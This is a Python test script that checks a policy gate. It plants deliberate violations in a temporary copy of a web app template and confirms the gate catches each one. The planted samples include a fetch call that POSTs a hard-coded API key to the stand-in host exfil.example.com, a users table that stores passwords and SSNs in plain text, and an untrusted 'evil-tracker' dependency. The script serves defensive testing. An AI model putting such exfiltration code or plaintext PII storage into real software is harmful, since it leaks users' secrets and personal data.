#!/usr/bin/env python3
"""Governance, demonstrated: the checked-in template is COMPLIANT, and a copy with
one violation of each rule is caught — secrets, network egress, CDN (offline),
plaintext PII, and an un-vetted dependency. Deterministic, offline.

    python3 scripts/test/policy_gate_demo.py
"""
import os
import shutil
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, "..", ".."))
sys.path.insert(0, os.path.join(ROOT, "scripts", "orch"))
import policy_gate as pg  # noqa: E402

TPL = os.path.join(ROOT, "templates", "react-vite-sqlite")


def _w(app, rel, content):
    p = os.path.join(app, rel)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w", encoding="utf-8") as f:
        f.write(content)


def main():
    checks = {}
    print("=== 1. The checked-in template is policy-COMPLIANT ===")
    clean = pg.check_policy(TPL)
    for r in clean["rules"]:
        print(f"   {'✔' if r['ok'] else '✘'} {r['rule']}")
    checks["template is compliant"] = clean["ok"]

    print("\n=== 2. A tampered copy violates every rule — all caught ===")
    tmp = tempfile.mkdtemp(prefix="adf-policy-demo-")
    app = os.path.join(tmp, "app")
    shutil.copytree(TPL, app,
                    ignore=shutil.ignore_patterns("node_modules", "dist", "*.db"))
    _w(app, "server/api/leak.mjs",
       "const KEY = 'sk-abcdEFGH1234567890ZXCVbnmQWERtyui'\n"
       "export default async function(app){ await fetch('https://exfil.example.com', "
       "{method:'POST', body: KEY}) }\n")
    _w(app, "index.html",
       '<script src="https://cdn.tailwindcss.com"></script><div id="root"></div>')
    _w(app, "schema.sql",
       "CREATE TABLE users (id INTEGER PRIMARY KEY, password TEXT, ssn TEXT);")
    import json
    pkg = json.load(open(os.path.join(app, "package.json")))
    pkg.setdefault("dependencies", {})["evil-tracker"] = "^1.0.0"
    json.dump(pkg, open(os.path.join(app, "package.json"), "w"))

    res = pg.check_policy(app)
    failed = set()
    for r in res["rules"]:
        mark = "✔" if r["ok"] else "✘"
        print(f"   {mark} {r['rule']}: "
              f"{'pass' if r['ok'] else str(len(r['violations'])) + ' violation(s)'}")
        for v in r["violations"][:2]:
            print(f"       - {v['file']}:{v['line']}  {v['detail'][:70]}")
        if not r["ok"]:
            failed.add(r["rule"])
    shutil.rmtree(tmp, ignore_errors=True)

    for rule in ("no_secrets", "no_network_egress", "offline_capable",
                 "no_plaintext_pii", "dependency_allowlist"):
        checks[f"caught {rule}"] = rule in failed

    ok = all(checks.values())
    print("\n=== Result ===")
    for name, passed in checks.items():
        print(f"  [{'PASS' if passed else 'FAIL'}] {name}")
    print("\nGATE PASS: ADF proves governance — compliant apps pass, violations are "
          "caught and located, and the verdict is sealed into the Proof of Build."
          if ok else "GATE FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
